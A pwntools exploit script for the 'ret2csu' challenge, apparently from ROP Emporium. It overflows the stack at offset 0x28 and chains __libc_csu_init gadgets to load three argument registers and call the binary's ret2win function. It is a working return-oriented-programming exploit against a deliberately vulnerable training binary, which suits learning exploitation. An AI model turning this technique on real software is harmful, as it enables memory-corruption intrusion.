#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

elf = context.binary = ELF('./ret2csu')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.log_level = 'debug'
context.delete_corefiles = True

# -- Exploit goes here --

# again I know the rip offset will be 0x28
rip_offset = 0x28

# gadget
jmp_rax = p64(0x400581)
pop_rdi_ret = p64(0x4006a3)
ret = p64(0x4006a4)
pop_rsi_r15_ret = p64(0x4006a1)

"""
  400680:    4c 89 fa                 mov    rdx,r15
  400683:    4c 89 f6                 mov    rsi,r14
  400686:    44 89 ef                 mov    edi,r13d
  400689:    41 ff 14 dc              call   QWORD PTR [r12+rbx*8]
"""
mov_rdx_r15 = p64(0x400680)

"""
  40069a:    5b                       pop    rbx
  40069b:    5d                       pop    rbp
  40069c:    41 5c                    pop    r12
  40069e:    41 5d                    pop    r13
  4006a0:    41 5e                    pop    r14
  4006a2:    41 5f                    pop    r15
  4006a4:    c3                       ret
"""
pop_rbx_rbp_r12x15_ret = p64(0x40069a)

io = start()

payload = flat(
    asm('nop') * rip_offset,

    # gadget 1
    pop_rbx_rbp_r12x15_ret,

    # rbx must be rbp-1
    0, # rbx
    1, # rbp

    # we need to place some address in r12 so that when it's called
    # it doesn't change the value of rdx
    # this address contains address to following code
    #    [0x004006b4]> pdf
    #            ;-- section..fini:
    #            ;-- .fini:
    #    / 9: sym._fini ();
    #    | bp: 0 (vars 0, args 0)
    #    | sp: 0 (vars 0, args 0)
    #    | rg: 0 (vars 0, args 0)
    #    |           0x004006b4      4883ec08       sub rsp, 8                  ; [14] -r-x section size 9 named .fini
    #    |           0x004006b8      4883c408       add rsp, 8
    #    \           0x004006bc      c3             ret
    0x600e48, # r12 = some address that is containing a pointer to some valid instruction

    # values to be placed in rdi, rsi, rdx
    0xdeadbeefdeadbeef, # r13
    0xcafebabecafebabe, # r14
    0xd00df00dd00df00d, # r15

    # set rdx and call using value in r12
    mov_rdx_r15,

    # manage 6 pops and one rsp+8
    p64(0)*7,

    # reset rdi value because that was distrubed
    pop_rdi_ret,
    0xdeadbeefdeadbeef,

    # finally call ret2win stub
    elf.plt.ret2win
)

io.sendlineafter('>', payload)

io.interactive()

